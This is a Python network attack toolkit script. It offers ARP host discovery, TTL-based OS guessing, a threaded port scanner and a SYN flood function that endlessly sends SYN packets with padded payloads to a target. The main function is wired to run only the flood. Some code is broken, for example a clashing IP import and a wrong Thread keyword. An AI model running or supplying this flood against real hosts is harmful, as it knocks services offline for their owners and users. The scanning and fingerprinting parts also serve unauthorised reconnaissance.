from IPy import IP
import optparse
from socket import *
import dns.resolver, dns.reversename
from scapy.all import *
import subprocess
import re
from threading import *

def reverseDns(ip):
    ip2=IP(ip)
    print(ip2.reverseName())
    print(socket.getnameinfo((ip, 0),0))

def networkdiscover(net_ip):
    arp = ARP(pdst=net_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    clients = []
    for sent, received in result:
        clients.append({'ip':received.psrc, 'mac': received.hwsrc})
    print("Available devices in the network: ")
    print("IP" + " "*12+"MAC")
    for client in clients:
        print("{:16}    {}".format(client['ip'], client['mac']))

def osdetect(os_ip):
    p = subprocess.Popen(["ping", "-c", "1",os_ip], stdout=subprocess.PIPE)
    res=p.communicate()[0]
    if p.returncode > 0:
        print('server error')
    else:
        pattern = re.compile('ttl=\d*')
        f = open("ostypes.txt","r")
        for line in f:
            a = line.strip().split("-")
            if a[1] == pattern.search(str(res)).group():
                print(a[0])
    
def connScan(Host, Port):
    try:
        sock = socket(AF_INET, SOCK_STREAM)
        sock.connect((Host,Port))
        print('[+] %d/tcp open' % Port)
    except:
        print('[-] %d/tcp closed' % Port)
    finally:
        sock.close()
def portScan(Host, Ports):
    try:
        ip_port = gethostbyname(Host)
    except:
        print('Unknown Host %s' % Host)
    try:
        tgtName = gethostbyaddr(ip_port)
        print('[+] Scan results for: ' + tgtName[0])
    except:
        print('[+] Scan results for: ' + ip_port)
    setdefaulttimeout(1)
    for Port in Ports:
        t = Thread(target=connScan, arguments=(Host, int(Port)))
        t.start()
def synFlood(target_ip):

    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), flags="S")
    raw = Raw(b"X"*2048)
    p = ip / tcp / raw
    packet_count=0
    while True:
        try:
            send(p, verbose=0)
            packet_count +=1   
            print(packet_count , " Package sent")
            
        except:
            exit()

def main():
    parser = optparse.OptionParser()
    parser.add_option('-r', dest='ip', help='Reversing ip.')
    parser.add_option('-n', dest='net_ip',help='Discover the available divaces same network .')
    parser.add_option('-o',dest='os_ip',help='Discover target operating system.')
    parser.add_option('-u', dest='Host', help='Specify target for the port scanner')
    parser.add_option('-p',dest='Port',help='Specify target ports for the port scanner seperated for comma <22,80>')
    parser.add_option('-s', dest='target_ip', help='Specify the target for Syn flood dont forget you must use the target port with this option')

    (options, arguments) = parser.parse_args()
 
  #  ip = options.ip
   # reverseDns(ip)
    #net_ip =options.net_ip
    #networkdiscover(net_ip)
    #os_ip = options.os_ip
    #osdetect(os_ip)
    target_ip = options.target_ip
    synFlood(target_ip) 
    #Host = options.Host
    #Ports = str(options.Port).split(',')
    #if (Host == None ) | (Ports[0] == None):
    #    print(parser.Usage)
     #   exit(0)
    #portScan(Host, Ports)
if __name__ == "__main__":
    main()
  
